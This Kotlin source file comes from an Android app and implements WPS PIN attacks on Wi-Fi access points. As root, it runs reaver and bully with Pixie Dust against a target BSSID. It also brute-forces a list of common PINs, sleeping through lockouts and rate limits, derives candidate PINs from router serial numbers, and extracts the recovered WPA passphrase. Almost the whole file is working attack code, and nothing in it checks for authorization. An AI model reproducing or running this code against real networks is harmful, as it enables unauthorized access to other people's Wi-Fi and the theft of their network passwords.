package com.alexcupsa.wifithermal.core.engine.wps

import com.alexcupsa.wifithermal.core.common.root.RootResult
import com.alexcupsa.wifithermal.core.common.root.RootShell
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn
import javax.inject.Inject
import javax.inject.Singleton

sealed interface WpsAttackEvent {
    data class Progress(val pin: String, val attempt: Int, val total: Int, val status: String) : WpsAttackEvent
    data class Success(val pin: String, val password: String) : WpsAttackEvent
    data class Locked(val lockoutSeconds: Int) : WpsAttackEvent
    data class Failed(val reason: String) : WpsAttackEvent
    data object RateLimited : WpsAttackEvent
    data object Completed : WpsAttackEvent
}

data class WpsTarget(
    val bssid: String,
    val ssid: String,
    val channel: Int,
    val wpsVersion: String?,
    val wpsLocked: Boolean,
)

@Singleton
class WpsPinAttack @Inject constructor(
    private val rootShell: RootShell,
) {
    companion object {
        private const val TERMUX_BIN = "/data/data/com.termux/files/usr/bin"
        private const val REAVER_PATH = "$TERMUX_BIN/reaver"
        private const val BULLY_PATH = "$TERMUX_BIN/bully"

        val COMMON_PINS = listOf(
            "12345670",
            "00000000",
            "01234567",
            "11111110",
            "22222220",
            "33333330",
            "44444440",
            "55555550",
            "66666660",
            "77777770",
            "88888880",
            "99999990",
            "12340000",
            "00001234",
        )
    }

    suspend fun isReaverInstalled(): Boolean {
        val result = rootShell.exec("test -x '$REAVER_PATH' && echo yes || echo no")
        return result is RootResult.Success && result.data.trim() == "yes"
    }

    suspend fun isBullyInstalled(): Boolean {
        val result = rootShell.exec("test -x '$BULLY_PATH' && echo yes || echo no")
        return result is RootResult.Success && result.data.trim() == "yes"
    }

    fun attackWithReaver(
        interface_: String,
        target: WpsTarget,
        pixieDust: Boolean = true,
        delayBetweenAttempts: Int = 1,
        timeoutSeconds: Int = 300,
    ): Flow<WpsAttackEvent> = flow {
        if (!isReaverInstalled()) {
            emit(WpsAttackEvent.Failed("reaver not installed in Termux"))
            return@flow
        }

        val cmd = buildString {
            append("$REAVER_PATH -i $interface_ -b ${target.bssid} -c ${target.channel}")
            if (pixieDust) append(" -K 1")
            append(" -d $delayBetweenAttempts")
            append(" -t $timeoutSeconds")
            append(" -vvv")
        }

        emit(WpsAttackEvent.Progress("", 0, 11000, "Starting reaver..."))

        val result = rootShell.exec(cmd, timeoutMs = (timeoutSeconds * 1000L) + 30_000)

        when (result) {
            is RootResult.Success -> {
                val output = result.data
                val passwordMatch = Regex("""WPA PSK:\s*'([^']+)'""").find(output)
                    ?: Regex("""WPA PSK:\s*(\S+)""").find(output)
                val pinMatch = Regex("""WPS PIN:\s*'?(\d{8})'?""").find(output)

                when {
                    passwordMatch != null -> {
                        emit(
                            WpsAttackEvent.Success(
                                pin = pinMatch?.groupValues?.get(1) ?: "unknown",
                                password = passwordMatch.groupValues[1],
                            )
                        )
                    }
                    output.contains("WPS transaction failed") -> {
                        emit(WpsAttackEvent.Failed("WPS transaction failed - AP may have WPS disabled"))
                    }
                    output.contains("rate limiting") || output.contains("WARNING: Detected AP rate limiting") -> {
                        emit(WpsAttackEvent.RateLimited)
                    }
                    output.contains("locked") -> {
                        val lockMatch = Regex("""locked.*?(\d+)""").find(output)
                        val seconds = lockMatch?.groupValues?.get(1)?.toIntOrNull() ?: 60
                        emit(WpsAttackEvent.Locked(seconds))
                    }
                    else -> {
                        emit(WpsAttackEvent.Failed("Attack completed without finding password"))
                    }
                }
            }
            is RootResult.Error -> emit(WpsAttackEvent.Failed(result.message))
            RootResult.NoRoot -> emit(WpsAttackEvent.Failed("Root access required"))
            RootResult.Timeout -> emit(WpsAttackEvent.Failed("Attack timed out"))
        }

        emit(WpsAttackEvent.Completed)
    }.flowOn(Dispatchers.IO)

    fun attackWithBully(
        interface_: String,
        target: WpsTarget,
        pixieDust: Boolean = true,
    ): Flow<WpsAttackEvent> = flow {
        if (!isBullyInstalled()) {
            emit(WpsAttackEvent.Failed("bully not installed in Termux"))
            return@flow
        }

        val cmd = buildString {
            append("$BULLY_PATH $interface_ -b ${target.bssid} -c ${target.channel}")
            if (pixieDust) append(" -d")
            append(" -v 3")
        }

        emit(WpsAttackEvent.Progress("", 0, 11000, "Starting bully..."))

        val result = rootShell.exec(cmd, timeoutMs = 600_000)

        when (result) {
            is RootResult.Success -> {
                val output = result.data
                val passwordMatch = Regex("""pass(?:word|phrase)?\s*[:=]\s*(\S+)""", RegexOption.IGNORE_CASE)
                    .find(output)

                if (passwordMatch != null) {
                    emit(WpsAttackEvent.Success(pin = "pixie", password = passwordMatch.groupValues[1]))
                } else if (output.contains("locked", ignoreCase = true)) {
                    emit(WpsAttackEvent.Locked(60))
                } else {
                    emit(WpsAttackEvent.Failed("Bully completed without finding password"))
                }
            }
            is RootResult.Error -> emit(WpsAttackEvent.Failed(result.message))
            RootResult.NoRoot -> emit(WpsAttackEvent.Failed("Root access required"))
            RootResult.Timeout -> emit(WpsAttackEvent.Failed("Attack timed out"))
        }

        emit(WpsAttackEvent.Completed)
    }.flowOn(Dispatchers.IO)

    fun bruteForceCommonPins(
        interface_: String,
        target: WpsTarget,
        pins: List<String> = COMMON_PINS,
        delayBetweenPins: Long = 5000,
    ): Flow<WpsAttackEvent> = flow {
        if (!isReaverInstalled()) {
            emit(WpsAttackEvent.Failed("reaver not installed"))
            return@flow
        }

        pins.forEachIndexed { index, pin ->
            emit(WpsAttackEvent.Progress(pin, index + 1, pins.size, "Trying PIN $pin"))

            val cmd = "$REAVER_PATH -i $interface_ -b ${target.bssid} -c ${target.channel} -p $pin -vvv"
            val result = rootShell.exec(cmd, timeoutMs = 30_000)

            when (result) {
                is RootResult.Success -> {
                    val output = result.data
                    val passwordMatch = Regex("""WPA PSK:\s*'?([^'\s]+)'?""").find(output)

                    if (passwordMatch != null) {
                        emit(WpsAttackEvent.Success(pin = pin, password = passwordMatch.groupValues[1]))
                        emit(WpsAttackEvent.Completed)
                        return@flow
                    }

                    if (output.contains("rate limiting", ignoreCase = true)) {
                        emit(WpsAttackEvent.RateLimited)
                        delay(60_000)
                    }

                    if (output.contains("locked", ignoreCase = true)) {
                        val lockMatch = Regex("""(\d+)\s*seconds?""").find(output)
                        val seconds = lockMatch?.groupValues?.get(1)?.toIntOrNull() ?: 60
                        emit(WpsAttackEvent.Locked(seconds))
                        delay(seconds * 1000L)
                    }
                }
                is RootResult.Error -> {
                    emit(WpsAttackEvent.Progress(pin, index + 1, pins.size, "Error: ${result.message}"))
                }
                RootResult.NoRoot -> {
                    emit(WpsAttackEvent.Failed("Root access required"))
                    return@flow
                }
                RootResult.Timeout -> {
                    emit(WpsAttackEvent.Progress(pin, index + 1, pins.size, "Timeout on PIN"))
                }
            }

            delay(delayBetweenPins)
        }

        emit(WpsAttackEvent.Failed("All common PINs exhausted"))
        emit(WpsAttackEvent.Completed)
    }.flowOn(Dispatchers.IO)

    fun computeChecksum(pin7: String): String {
        if (pin7.length != 7 || !pin7.all { it.isDigit() }) {
            return pin7
        }
        var accum = 0
        var factor = 3
        for (c in pin7) {
            accum += (c - '0') * factor
            factor = if (factor == 3) 1 else 3
        }
        val checksum = (10 - (accum % 10)) % 10
        return "$pin7$checksum"
    }

    fun generatePinsFromSerial(serial: String): List<String> {
        val pins = mutableListOf<String>()

        val numericPart = serial.filter { it.isDigit() }.takeLast(7)
        if (numericPart.length == 7) {
            pins.add(computeChecksum(numericPart))
        }

        val last6 = serial.takeLast(6)
        if (last6.all { it.isDigit() }) {
            pins.add(computeChecksum("0$last6"))
            pins.add(computeChecksum("1$last6"))
        }

        return pins.distinct()
    }
}
